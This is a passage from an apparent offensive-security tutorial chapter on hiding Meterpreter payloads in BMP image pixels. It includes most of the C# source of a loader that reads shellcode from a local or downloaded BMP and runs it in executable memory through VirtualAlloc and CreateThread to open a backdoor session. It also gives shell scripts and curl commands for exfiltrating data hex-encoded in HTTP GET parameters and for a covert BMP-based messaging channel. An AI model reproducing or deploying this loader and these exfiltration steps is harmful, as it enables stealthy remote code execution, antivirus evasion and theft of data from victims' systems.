_bmp_x.Length;)\n\r\n\r                    {\n\r\n\r                        xPayload_Temp[i + StartAddress] = Convert.ToByte(_bmp_x[i], 16);\n\r\n\r \n\r\n\r \n\r\n\r                        if (i == 0)\n\r\n\r                        {\n\r\n\r                            Console.Write(\"[&gt;] Injecting Payload (length {0}) : \", _bmp_x.Length.ToString());\n\r\n\r                        }\n\r\n\r                        if (i &lt;= 16)\n\r\n\r                        {\n\r\n\r                            Console.Write(_bmp_x[i]);\n\r\n\r                        }\n\r\n\r                        i++;\n\r\n\r                    }\n\r\n\r                    File.WriteAllBytes(FileName, xPayload_Temp);\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.WriteLine(\"[!] File {0} with length {1} bytes Modified.\", FileName, xPayload_Temp.Length.ToString());\n\r\n\r \n\r\n\r                }\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            }\n\r\n\r            catch (Exception)\n\r\n\r            {\n\r\n\r \n\r\n\r                throw;\n\r\n\r            }\n\r\n\r            return \"\";\n\r\n\r \n\r\n\r        }\n\r\n\r \n\r\n\r            static void Main(string[] args)\n\r\n\r        {\n\r\n\r \n\r\n\r            if (args.Length &lt; 1)\n\r\n\r            {\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                Console.WriteLine(\"NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine(\"Detecting/Injecting Meterpreter Payload bytes from BMP Image Files\");                                                \n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                Console.WriteLine(\"Injecting Syntax :\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                Console.WriteLine(\"Syntax Creating New Bitmap File by template:\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine(\"Syntax  I: NativePayload_Image.exe create [NewFileName.bmp] [Meterpreter_payload] \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"Example I: NativePayload_Image.exe create test.bmp fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                Console.WriteLine(\"Syntax Modify Bitmap File by New Payload:\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine(\"Syntax  II: NativePayload_Image.exe modify [ExistFileName.bmp] [header_length] [Meterpreter_payload]  \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"Example II: NativePayload_Image.exe modify test.bmp  54  fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                Console.WriteLine(\"Detecting and Getting Meterpreter Session (backdoor mode) Syntax :\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                Console.WriteLine(\"Syntax Getting Meterpreter Session by local BMP File:\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"Syntax  I: NativePayload_Image.exe bitmap [ExistFileName.bmp] [Payload_length] [BMP_Header_Length] \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"Example I: NativePayload_Image.exe bitmap test.bmp 510 54\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                Console.WriteLine(\"Syntax Getting Meterpreter Session with Url by http Traffic\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"Syntax  II: NativePayload_Image.exe url [target url] [Payload_length] [BMP_Header_Length] \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(@\"Example II: NativePayload_Image.exe url http://192.168.1.2/images/test.bmp 510 54\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                Console.WriteLine(\"Syntax Getting Meterpreter Session by local/Web Encrypted BMP File:\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine(\"Syntax  III: NativePayload_Image.exe decrypt [target url or local filename] [Payload_length] [BMP_Header_Length] \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(@\"Example III: NativePayload_Image.exe decrypt http://192.168.1.2/images/test.bmp 510 54\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            }\n\r\n\r            else\n\r\n\r            {\n\r\n\r                if (args[0].ToUpper() == \"CREATE\")\n\r\n\r                {\n\r\n\r                    /// Example I: NativePayload_Image.exe create test.bmp fc4883e4f0e8cc00000041514150\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                    Console.WriteLine(\"NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine(\"Detecting/Injecting Meterpreter Payload bytes from BMP Image Files\");\n\r\n\r                    Console.WriteLine();\n\r\n\r \n\r\n\r                    String S1 = args[1];\n\r\n\r                    String S2 = args[2];\n\r\n\r                    \n\r\n\r                    InjectPayload_to_BMP(S2, Default_Header_BMP, Ex_Payload_BMP_Length, true, S1);\n\r\n\r                }\n\r\n\r                if (args[0].ToUpper() == \"MODIFY\")\n\r\n\r                {\n\r\n\r                    /// Example II: NativePayload_Image.exe modify test.bmp  54  fc4883e4f0e8cc00000041514150\n\r\n\r                    /// InjectPayload_to_BMP(pay, 54, 510, false, \"demo1.bmp\");\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                    Console.WriteLine(\"NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine(\"Detecting/Injecting Meterpreter Payload bytes from BMP Image Files\");\n\r\n\r                    Console.WriteLine();\n\r\n\r \n\r\n\r                    InjectPayload_to_BMP(args[3], Convert.ToInt32(args[2]), false, args[1]);\n\r\n\r                }\n\r\n\r                if (args[0].ToUpper() == \"BITMAP\")\n\r\n\r                {\n\r\n\r                    try\n\r\n\r                    {\n\r\n\r                        ///\"Example I: NativePayload_Image.exe bitmap test.bmp 510 54\"\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                        Console.WriteLine(\"NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017\");\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                        Console.WriteLine(\"Detecting/Injecting Meterpreter Payload bytes from BMP Image Files\");\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                        Console.WriteLine(\"[+] Detecting Meterpreter Payload bytes by Image Files\");\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                        Console.WriteLine(\"[+] File Scanning .. . . \");\n\r\n\r \n\r\n\r                        string filename = args[1];\n\r\n\r \n\r\n\r                        byte[] xPayload = File.ReadAllBytes(filename);\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                        Console.WriteLine(\"[+] Reading Payloads from \\\"{0}\\\" file \", filename);\n\r\n\r                        Console.WriteLine(\"[+] Scanning Payload with length {0} from byte {1}\", args[2], args[3]);\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r                        int offset = Convert.ToInt32(args[3]);\n\r\n\r                        int counter = 0;\n\r\n\r                        int Final_Payload_Length = Convert.ToInt32(args[2]);\n\r\n\r                        byte[] Final = new byte[Convert.ToInt32(args[2])];\n\r\n\r \n\r\n\r                        for (int i = 0; i &lt;= xPayload.Length; i++)\n\r\n\r                        {\n\r\n\r                            if (i &gt;= offset)\n\r\n\r                            {\n\r\n\r                                if (counter == Final_Payload_Length) break;\n\r\n\r \n\r\n\r                                Final[counter] = xPayload[i];\n\r\n\r                                counter++;\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r \n\r\n\r                        UInt32 MEM_COMMIT = 0x1000;\n\r\n\r                        UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r \n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                        Console.WriteLine(\"Bingo Meterpreter session by BMP images ;)\");\n\r\n\r \n\r\n\r                        UInt32 funcAddr = VirtualAlloc(0x00000000, (UInt32)Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                        Marshal.Copy(Final, 0x00000000, (IntPtr)(funcAddr), Final.Length);\n\r\n\r \n\r\n\r                        IntPtr hThread = IntPtr.Zero;\n\r\n\r                        UInt32 threadId = 1;\n\r\n\r                        IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r                        hThread = CreateThread(0x00000000, 0x00000000, funcAddr, pinfo, 0x00000000, ref threadId);\n\r\n\r                        WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    }\n\r\n\r                    catch (Exception)\n\r\n\r                    {\n\r\n\r \n\r\n\r                        throw;\n\r\n\r                    }\n\r\n\r                }\n\r\n\r                if (args[0].ToUpper() == \"URL\")\n\r\n\r                {\n\r\n\r                    try\n\r\n\r                    {\n\r\n\r                        ///\"Example I: NativePayload_Image.exe url http://192.168.1.2/test.bmp 510 54\"\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                        Console.WriteLine(\"NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017\");\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                        Console.WriteLine(\"Detecting/Injecting Meterpreter Payload bytes from BMP Image Files\");\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                        Console.WriteLine(\"[+] Detecting Meterpreter Payload bytes by Image Files\");\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                        Console.WriteLine(\"[+] File Scanning .. . . \");\n\r\n\r \n\r\n\r                        System.Net.WebClient web = new System.Net.WebClient();                        \n\r\n\r                        byte[] xPayload = web.DownloadData(args[1].ToString());\n\r\n\r                                                                                             \n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                        Console.WriteLine(\"[+] Reading Payloads from URL  \\\"{0}\\\"  \",args[1]);\n\r\n\r                        Console.WriteLine(\"[+] Scanning Payload with length {0} from byte {1}\", args[2], args[3]);\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r                        int offset = Convert.ToInt32(args[3]);\n\r\n\r                        int counter = 0;\n\r\n\r                        int Final_Payload_Length = Convert.ToInt32(args[2]);\n\r\n\r                        byte[] Final = new byte[Convert.ToInt32(args[2])];\n\r\n\r \n\r\n\r                        for (int i = 0; i &lt;= xPayload.Length; i++)\n\r\n\r                        {\n\r\n\r                            if (i &gt;= offset)\n\r\n\r                            {\n\r\n\r                                if (counter == Final_Payload_Length) break;\n\r\n\r \n\r\n\r                                Final[counter] = xPayload[i];\n\r\n\r                                counter++;\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r                        UInt32 MEM_COMMIT = 0x1000;\n\r\n\r                        UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r \n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                        Console.WriteLine(\"Bingo Meterpreter session by BMP images ;)\");\n\r\n\r \n\r\n\r                        UInt32 funcAddr = VirtualAlloc(0x00000000, (UInt32)Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                        Marshal.Copy(Final, 0x00000000, (IntPtr)(funcAddr), Final.Length);\n\r\n\r \n\r\n\r                        IntPtr hThread = IntPtr.Zero;\n\r\n\r                        UInt32 threadId = 1;\n\r\n\r                        IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r                        hThread = CreateThread(0x00000000, 0x00000000, funcAddr, pinfo, 0x00000000, ref threadId);\n\r\n\r                        WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    }\n\r\n\r                    catch (Exception)\n\r\n\r                    {\n\r\n\r \n\r\n\r                        throw;\n\r\n\r                    }\n\r\n\r                }\n\r\n\r                if (args[0].ToUpper() == \"DECRYPT\")\n\r\n\r                {\n\r\n\r                    /// not ready ;D\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                    Console.WriteLine(\"NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine(\"Detecting/Injecting Meterpreter Payload bytes from BMP Image Files\");\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                    Console.WriteLine(\"Encryption Method not Ready for this version ;)\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                }\n\r\n\r \n\r\n\r            }\n\r\n\r        }\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r    }\n\r\n\r}","","topics\\Chapter 11 - Part 1.html","\n\r\n\r \n\r\n\rHiding Payloads via BMP Image Pixels (PART2)\n\r\n\r \n\r\n\rIn this (Part2) I want to talk about “NativePayload_Image.sh” v.2 Script and linux systems only . We talked about this method “step by step”  by “Part1 of Chapter-11” so in this time I just want to explain this method by Script “NativePayload_Image.sh” v2 Step by step:\n\r\n\r \n\r\n\rInjecting Text/Data/Payload to BMP files (Text-Data)\n\r\n\rFirst of all with this syntax1 you can have Injected Text-Data into BMP files very simple by these two method : first by \'text-data” and second by “meterpreter-data” , I will talk about Meterpreter but in this time I will show you Text-Data Method by “Picture 1”.\n\r\n\r \n\r\n\rSyntax 1 : Injecting Text/Data/Payload to BMP files :\n\r\n\r./NativePayload_Image.sh -makebmp text  “your Text-message or Text-Data”\n\r\n\rSyntax Description: injecting “Text/Data” to BMP file “test.bmp”\n\r\n\r./NativePayload_Image.sh -makebmp meterpreter  “Msfvenom Payload (Backdoor-Payload)”\n\r\n\rSyntax Description: injecting “Meterpreter Payload” to BMP file “test.bmp”\n\r\n\r  \n\r\n\rPicture 1: \n\r\n\r \n\r\n\ras you can see in this “Picture 1”  with switches “-makebmp” and “text” you will have New BMP file “test.bmp”.\n\r\n\r \n\r\n\rReading Text/Data/Payload from BMP files :\n\r\n\rNow you need to Read Data from BMP files so by these two Switches you can read DATA/Payload from BMP Files:\n\r\n\rWith “Syntax 2” you can Read Injected Payload from BMP files:\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r \n\r\n\rSyntax 2 : Reading Text/Data/Payload from BMP files :\n\r\n\r./NativePayload_Image.sh -readpay test.bmp\n\r\n\rSyntax Description: reading “Text/Data/Payload” from BMP file “test.bmp”\n\r\n\r./NativePayload_Image.sh -readbmp test.bmp\n\r\n\rSyntax Description: Reading BMP files by Hexdump Tool \n\r\n\rPicture 2:\n\r\n\r \n\r\n\r\n\r\n\r \n\r\n\r \n\r\n\r\n\r\n\r\n\r\n\rInjecting Text/Data/Payload to BMP files (Meterpreter-Data)\n\r\n\ras you can see in the next “Pictures 3 and 4” we can have Injected Meterpreter Payload via BMP files by this syntax :\n\r\n\r \n\r\n\rSyntax 1 : Injecting Text/Data/Payload to BMP files :\n\r\n\r./NativePayload_Image.sh -makebmp text  “your Text-message or Text-Data”\n\r\n\rSyntax Description: injecting “Text/Data” to BMP file “test.bmp”\n\r\n\r./NativePayload_Image.sh -makebmp meterpreter  “Msfvenom Payload (Backdoor-Payload)”\n\r\n\rSyntax Description: injecting “Meterpreter Payload” to BMP file “test.bmp” \n\r\n\rPicture 3: \n\r\n\r \n\r\n\rPicture 4:\n\r\n\rNow you can use “NativePayload_Image.exe” , (C# tool) and this “test.bmp” for Meterpreter Session so your syntax with this C# code should be something like this :\n\r\n\rNativePayload_Image.exe url  http://192.168.56.101/test.bmp  510  54\n\r\n\r \n\r\n\rNote: For more information about this please watch Video Chapter-11 : Hiding Payload via BMP Image Pixels\n\r\n\r \n\r\n\rDATA Exfiltration by Sending HTTP Traffic (Sending Data by Web Requests and id Values).\n\r\n\r \n\r\n\rIn this method you can send BMP files by HTTP traffic without Transferred BMP files over HTTP traffic as BMP format file , it means you can send Bytes of BMP file via Web Requests and for doing this only you need to use “id=[Bytes-Values)] as BMP Payload”\n\r\n\rso let me explain this Method and Technique step by step :\n\r\n\rfor example we have these Payloads=”this is my BMP payload” and  “this is my second BMP payload” for Exfiltration via Web Requests “/GET”.\n\r\n\rso in Client side we will have something like these Commands for Sending DATA to server  :\n\r\n\r \n\r\n\rClient side :\n\r\n\rroot@kali:~# echo \"this is my bmp payload\" | xxd -p \n\r\n\r74686973206973206d7920626d70207061796c6f61640a\n\r\n\rroot@kali:~# echo \"this is my bmp payload\" | xxd -p | rev \n\r\n\ra04616f6c69716070207d6260297d60237960237968647\n\r\n\rroot@kali:~#\n\r\n\rroot@kali:~# curl http://127.0.0.1/Mainpage.aspx?ids=a04616f6c69716070207d6260297d60237960237968647 \n\r\n\r&lt;head&gt;\n\r\n\r&lt;title&gt;Error response&lt;/title&gt;\n\r\n\r&lt;/head&gt;\n\r\n\r&lt;body&gt;\n\r\n\r&lt;h1&gt;Error response&lt;/h1&gt;\n\r\n\r&lt;p&gt;Error code 404.\n\r\n\r&lt;p&gt;Message: File not found.\n\r\n\r&lt;p&gt;Error code explanation: 404 = Nothing matches the given URI.\n\r\n\r&lt;/body&gt;\n\r\n\rroot@kali:~# \n\r\n\rroot@kali:~# echo \"this is my second bmp payload\" | xxd  -p\n\r\n\r74686973206973206d79207365636f6e6420626d70207061796c6f61640a\n\r\n\rroot@kali:~# echo \"this is my second bmp payload\" | xxd  -p | rev\n\r\n\ra04616f6c69716070207d6260246e6f63656370297d60237960237968647\n\r\n\rroot@kali:~#\n\r\n\rroot@kali:~# curl http://127.0.0.1/Mainpage.aspx?ids=a04616f6c69716070207d6260246e6f63656370297d60237960237968647\n\r\n\r&lt;head&gt;\n\r\n\r&lt;title&gt;Error response&lt;/title&gt;\n\r\n\r&lt;/head&gt;\n\r\n\r&lt;body&gt;\n\r\n\r&lt;h1&gt;Error response&lt;/h1&gt;\n\r\n\r&lt;p&gt;Error code 404.\n\r\n\r&lt;p&gt;Message: File not found.\n\r\n\r&lt;p&gt;Error code explanation: 404 = Nothing matches the given URI.\n\r\n\r&lt;/body&gt;\n\r\n\rroot@kali:~# \n\r\n\r \n\r\n\r \n\r\n\rNote I got Error because I don\'t have “Mainpage.aspx” file in server side but to avoid “Error Code 404” just we need to Create this file in server side by this command :\n\r\n\r \n\r\n\recho “Ops here ;)“  &gt;  Mainpage.aspx\n\r\n\r \n\r\n\rin Server side we should have something like these Commands to Dump Exfiltration DATA by Web server and log file .\n\r\n\r \n\r\n\rServer side :\n\r\n\rroot@kali2:~# nohup python -m SimpleHTTPServer 80 &gt; SimpleHTTPServer.txt  2&gt;&amp;1 &amp;\n\r\n\r[1] 1744\n\r\n\rroot@kali2:~# \n\r\n\rroot@kali2:~# cat SimpleHTTPServer.txt \n\r\n\rnohup: ignoring input\n\r\n\r127.0.0.1 - - [24/Dec/2018 15:30:35] code 404, message File not found\n\r\n\r127.0.0.1 - - [24/Dec/2018 15:30:35] \"GET /Mainpage.aspx?ids=a04616f6c69716070207d6260297d60237960237968647 HTTP/1.1\" 404 -\n\r\n\r127.0.0.1 - - [24/Dec/2018 15:31:32] code 404, message File not found\n\r\n\r127.0.0.1 - - [24/Dec/2018 15:31:32] \"GET /Mainpage.aspx?ids=a04616f6c69716070207d6260246e6f63656370297d60237960237968647 HTTP/1.1\" 404 -\n\r\n\rroot@kali2:~# cat SimpleHTTPServer.txt  | grep \"ids=\"\n\r\n\rroot@kali2:~# \n\r\n\r127.0.0.1 - - [24/Dec/2018 15:30:35] \"GET /Mainpage.aspx?ids=a04616f6c69716070207d6260297d60237960237968647 HTTP/1.1\" 404 -\n\r\n\r127.0.0.1 - - [24/Dec/2018 15:31:32] \"GET /Mainpage.aspx?ids=a04616f6c69716070207d6260246e6f63656370297d60237960237968647 HTTP/1.1\" 404 -\n\r\n\rroot@kali2:~# \n\r\n\rroot@kali2:~# cat SimpleHTTPServer.txt  | grep \"ids=\" | awk {\'print $7\'} | cut -d\'=\' -f2 \n\r\n\ra04616f6c69716070207d6260297d60237960237968647\n\r\n\ra04616f6c69716070207d6260246e6f63656370297d60237960237968647\n\r\n\rroot@kali2:~# \n\r\n\rroot@kali2:~# cat SimpleHTTPServer.txt  | grep \"ids=\" | awk {\'print $7\'} | cut -d\'=\' -f2 | rev | xxd -r -p\n\r\n\rthis is my bmp payload\n\r\n\rthis is my second bmp payload\n\r\n\rroot@kali2:~# \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rafter these steps by commands now you can understand what exactly happened in the next pictures .\n\r\n\rSo our syntaxes for this Exfiltration Method are these:\n\r\n\r \n\r\n\rSyntax 3 : Data Exfiltration by Web Requests and BMP Files!\n\r\n\rServer-side::Syntax\n\r\n\r./NativePayload_Image.sh  -exfilwebserver  Listen-Port[8080]\n\r\n\r./NativePayload_Image.sh  -exfilwebserver  80\n\r\n\rDescription: Running Exfiltration-WebServer (Server-side: Listening/Monitoring Web Requests and log file) \n\r\n\r \n\r\n\rClient-side::Syntax \n\r\n\r./NativePayload_Image.sh -sendhttp mybmpfile.bmp IPv4_for_ServerSide  Server-Port[80]  Delay[0.4] \n\r\n\r./NativePayload_Image.sh -sendhttp  mybmpfile.bmp  192.168.56.100  80  0.3\n\r\n\rDescription: Sending Bmp File to IPv4-Server-side via Web Requests by Delay[x] (Exfiltration:HTTP Traffic only)\n\r\n\r \n\r\n\r \n\r\n\ras you can see in the next “Picture 5” we have two systems with (IPv4: Server-Side 56.102 and Client-Side 56.101).\n\r\n\ras you can see before send this file “test.bmp” by “switch -sendhttp” , I read Payload for that and this text-data injected to this file before this step : Payload=”this is my Payload/Text for injection by BMP Files”\n\r\n\rnow I want to send this text-data via Web Traffic to Server side , \n\r\n\rafter this step in Server-side my tool will create new BMP file with name “Dumped_via_http_test.bmp” by Read/Reassembled Information from Web-server log file.\n\r\n\r \n\r\n\r  \n\r\n\rPicture 5:\n\r\n\r \n\r\n\rin the Next “Picture 6 and 7 “ you can see these Information Transferred by Web Queries....\n\r\n\r  \n\r\n\rPicture 6:\n\r\n\r Picture 7: \n\r\n\ras you can see BMP File “Dumped_via_Http_test.bmp” Created by these Information very well.\n\r\n\r \n\r\n\r \n\r\n\r  \n\r\n\rPicture 8:\n\r\n\r \n\r\n\rnow in “Picture 8” you can compare our payloads between “test.bmp” and “Dumped_via_Http_test.bmp”\n\r\n\r \n\r\n\rDATA Exfiltration:\n\r\n\ras you can see both files have same Payload , Now DATA Transferred from Client to Server via BMP Formats by HTTP Traffic and now you can say “DATA Exfiltrated” from Client to Server.\n\r\n\r \n\r\n\rExtracting Injected Payloads from BMP Files via HTTP traffic\n\r\n\rin this time with these two simple Syntaxes you can you can see Injected Payloads for BMP Files very simple.\n\r\n\rFor doing this just you need to use switch “-gethttp” in client side and in server side you need Web-server (switch -webserver).\n\r\n\r \n\r\n\rSyntax 4 : Extracting Injected Payloads from BMP Files by HTTP traffic!\n\r\n\rServer-side::Syntax\n\r\n\r./NativePayload_Image.sh  -webserver  Port[8080]\n\r\n\r./NativePayload_Image.sh  -webserver 80\n\r\n\rDescription: Running SimpleWebServer (Server-side: Web-Service only) \n\r\n\r \n\r\n\rClient-side::Syntax\n\r\n\r./NativePayload_Image.sh  -gethttp IPv4_for_Server File.bmp Server-Port[80]\n\r\n\r./NativePayload_Image.sh  -gethttp 192.168.56.102 Dumped_via_http.test.bmp 80\n\r\n\rDescription: Dump/Download BMP file from Web Server by “/GET” Request (Extracting Injected Payloads from BMP Files)\n\r\n\r  \n\r\n\rPicture 9: \n\r\n\ras you can see in this “Picture 9” that BMP file Downloaded by HTTP “/GET” Request and Payload Saved to text file.\n\r\n\r \n\r\n\rTransferring “Text-Messages &amp; Commands” via BMP Image Files \n\r\n\rin this Section of Chapter-11 , I want to talk about Send/Receiving BMP files over HTTP Traffic , it means you will have a lot BMP files in Network Traffic (*.bmp) as DATA/Payload.\n\r\n\rSo this is talk about Normal HTTP Traffic for Websites or it is talk about Send/Receiving BMP Files in the Network with/without Encryption in BMP Payloads.\n\r\n\r \n\r\n\rSending “Text-Messages” by this method step by step :\n\r\n\rStep1   : SystemA want to send “text-data1” ---- &gt; SystemB\n\r\n\rStep1-1: SystemA , “text-data1” injected to BMP1 , now BMP1 is Ready...\n\r\n\rStep1-2: SystemA send Signal to –----&gt; SystemB for Download BMP1\n\r\n\rStep2   : SystemB Downloaded BMP1 from SystemA over HTTP traffic , show Text-Data (clear-text Message)\n\r\n\rStep2-1: SystemB want to send “text-data2” ---- &gt; SystemA\n\r\n\rStep2-2: SystemB , ”text-data2” injected to BMP2 , now BMP2 is Ready...\n\r\n\rStep2-3: SystemB send Signal to –---&gt; SystemA for Download BMP2\n\r\n\rStep3   : SystemA Downloaded BMP2 from SystemB over HTTP traffic , show Text-Data (clear-text Message)\n\r\n\r \n\r\n\rwith this Syntax you can use this Code to Send/Receiving Text-Messages via BMP files over HTTP Traffic.\n\r\n\r \n\r\n\rSyntax 5 : Send/Rec Text-Messages and Commands via BMP Files by HTTP Traffic!\n\r\n\rServer-side::Syntax\n\r\n\r./NativePayload_Image.sh  -chatserver  L  80  Client-IPv4  R  80 \n\r\n\r./NativePayload_Image.sh  -chatserver  l  80  192.168.56.102  r 80 \n\r\n\rDescription: Server-IPv4::192.168.56.101\n\r\n\r \n\r\n\rClient-side::Syntax\n\r\n\r./NativePayload_Image.sh  -chatclient  L  80  Server-IPv4  R  80 \n\r\n\r./NativePayload_Image.sh  -chatclient  l  80  192.168.56.101  r  80 \n\r\n\rDescription: Client-IPv4::192.168.56.102\n\r\n\r \n\r\n\r \n\r\n\rin the next “Picture 10” you can see I used Two systems for Test this code with (IPv4 192.168.56.101 &amp; 192.168.56.102). \n\r\n\rPicture 10 :\n\r\n\rin Next “Picture 11” you can see Result for Send/Rec Message by this tool between two systems.\n\r\n\r  \n\r\n\rPicture 11:\n\r\n\rand I used Wireshark to show you what exactly happened over Network Traffic and this is good way to understanding steps behind this Method .\n\r\n\rIn the next “Picture 12” you can see this Text/Payload “this is my first message via BMP files” injected to BMP file “ChatviaPixels.bmp” with Server-side system with IPv4 : 192.168.56.101 , then in the next step this file is ready to download by Client side system over HTTP traffic . \n\r\n\rIn this step Server side sent Signal to Client side and this BMP file Downloaded by Client-Side IPv4 : 192.168.56.102\n\r\n\rand you can see this file Saved to Client-side system with name “ChatviaPixels.bmp.1” and Finally in the last step you can see this Text-Messages in Client-side (Clear-text) also with wireshark you can see Network HTTP Traffic and Image Packet with length (5k) for this BMP File.\n\r\n\r \n\r\n\r  \n\r\n\rPicture 12:\n\r\n\rin then next “Picture 13” you can see Payload of BMP file in Packet also you can see RAW Data and Clear-text Message too.\n\r\n\r  \n\r\n\rPicture 13:\n\r\n\ras you can see in this “Picture 13” we have this Payload “-38+this is my first message via BMP files......” and now you can see where is my Text-data and Messages in the Network Traffic.\n\r\n\rin the next “Picture 14” you can see we have New Message “this is my second test ;)” by Client-side and in this step Client made New BMP2 in this Case “ChatviaPixelsII.bmp” and our Text-data Injected to this file also signal Sent to Server-side and this File downloaded by Server and saved to Server-side with name “ChatviaPixelsII.bmp.1”.\n\r\n\r \n\r\n\r \n\r\n\r  \n\r\n\rPicture 14:\n\r\n\r \n\r\n\ras you can see in this “Picture 15” we have this Payload “-25+this is my second test ;)”  in the HTTP Packet and now you can see where is my Text-data and Messages in the Network Traffic.\n\r\n\r Picture 15: \n\r\n\rUsing Base64 Encoding for BMP Payloads and Text-messages \n\r\n\rin this time I typed this Command “@base64on” instead Text-message:\n\r\n\r 